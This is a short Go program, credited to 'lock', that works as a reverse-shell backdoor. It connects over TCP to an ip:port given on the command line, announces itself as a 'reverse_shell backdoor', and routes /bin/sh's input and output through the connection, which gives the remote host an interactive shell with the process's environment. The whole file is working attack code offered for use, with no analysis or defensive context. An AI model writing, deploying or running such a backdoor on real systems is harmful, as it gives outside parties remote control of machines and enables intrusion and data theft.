/**
 * Created by lock
 */
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

var (
	shell    = "/bin/sh"
	remoteIp string
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: " + os.Args[0] + " ip:port ")
		os.Exit(0)
	}
	remoteIp = os.Args[1]
	remoteConn, err := net.DialTimeout("tcp", remoteIp, time.Second*5)
	if err != nil {
		fmt.Println("connecting err:", err)
		return
	}
	_, _ = remoteConn.Write([]byte("reverse_shell backdoor\n"))
	command := exec.Command(shell)
	command.Env = os.Environ()
	command.Stdin = remoteConn
	command.Stdout = remoteConn
	command.Stderr = remoteConn
	_ = command.Run()
}
